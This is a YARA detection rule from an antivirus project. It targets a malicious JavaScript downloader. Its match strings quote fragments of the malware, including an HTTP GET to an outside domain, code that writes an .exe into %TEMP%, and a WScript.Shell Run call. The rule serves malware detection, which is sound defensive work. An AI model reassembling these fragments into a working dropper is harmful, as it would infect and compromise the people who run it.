rule sig_20160330_f3211833316c856ed8fcbdf0827dfeab {
  meta:
    description = "datamaliciousorder - file 20160330_f3211833316c856ed8fcbdf0827dfeab.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7e44728c5fd14143bc25126953fb532bc85cab185e55089f8b5766d367550c06"

  strings:
    $s1  = "_Y0[_XQ](\"GET\", \"http://mylookalikedoll.com/n2iks\", false);" fullword ascii
    $s2  = "function _H() {return _B[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"mmgM5dlljd6.ex\" + \"e\";};" fullword ascii
    $s3  = "function _I(_Q0, _SM){_DV = _DV * 1; return _Q0 - _SM;};" fullword ascii
    $s4  = "var _B = function _Y() {return WScript[_V](\"WScript\"+\".Shell\");}(), _JG = 11;" fullword ascii
    $s5  = "if (_Y0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s6  = "function _Q(){return _H1 + \"\";};" fullword ascii
    $s7  = "function _XS(_D){_B[\"Run\"](_D, _DV, _DV);};" fullword ascii
    $s8  = "function _J() {return ((_J0 == true) && (_J0 == _PL)) ? 1 : _DV;};" fullword ascii
    $s9  = " while (_W){" fullword ascii
    $s10 = "var _C = new this[\"Date\"]();" fullword ascii
    $s11 = "function _DP(){return _V;};" fullword ascii
    $s12 = "function _BO()" fullword ascii
    $s13 = "function _MJ(){return 22;};" fullword ascii
    $s14 = "function _H0(_L) {var _YX = (1, 2, 3, 4, 5, _L); return _YX;};" fullword ascii
    $s15 = "return _I(_HG, _N);" fullword ascii
    $s16 = "_J0 = true; " fullword ascii
    $s17 = "var _J0 = false;" fullword ascii
    $s18 = "var _PL = false;" fullword ascii
    $s19 = "var _DJ = false;" fullword ascii
    $s20 = "_PL = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}